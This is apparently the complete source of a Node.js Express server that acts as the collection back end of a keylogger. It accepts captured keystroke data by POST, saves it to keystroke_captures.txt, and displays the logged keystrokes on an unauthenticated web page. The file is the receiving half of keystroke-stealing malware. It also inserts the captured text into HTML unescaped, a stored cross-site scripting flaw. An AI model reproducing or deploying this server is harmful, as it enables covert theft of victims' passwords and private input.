const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

// Use body-parser to parse JSON bodies
app.use(bodyParser.json({ extended: true }));

const port = 8080;

// Route to handle GET requests and display logged keystrokes
app.get("/", (req, res) => {
    try {
        // Read the keystrokes from the file
        const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
        
        // Replace newline characters with <br> for HTML formatting
        res.send(`
            <html>
            <head>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        margin: 0;
                        padding: 0;
                        background-color: #f4f4f4;
                    }
                    .container {
                        max-width: 800px;
                        margin: 20px auto;
                        padding: 20px;
                        background-color: #fff;
                        border-radius: 8px;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    }
                    h1 {
                        color: #333;
                    }
                    p {
                        color: #666;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Logged data</h1>
                    <p>${kl_file.replace(/\n/g, "<br>")}</p>
                </div>
            </body>
            </html>
        `);
    } catch {
        // If file doesn't exist or any error occurs, send a message indicating no data
        res.send(`
            <html>
            <head>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        margin: 0;
                        padding: 0;
                        background-color: #f4f4f4;
                    }
                    .container {
                        max-width: 400px;
                        margin: 20px auto;
                        padding: 20px;
                        background-color: #fff;
                        border-radius: 8px;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    }
                    h1 {
                        color: #333;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Nothing Logged yet.</h1>
                </div>
            </body>
            </html>
        `);
    }
});


// Route to handle POST requests and save the keystrokes data
app.post("/", (req, res) => {
    console.log(req.body.keyboardData);
    
    // Write the received keystrokes data to the file
    fs.writeFileSync("keystroke_captures.txt", req.body.keyboardData);
    res.send("Successfully set the data");
});

// Start the server and listen on the specified port
app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
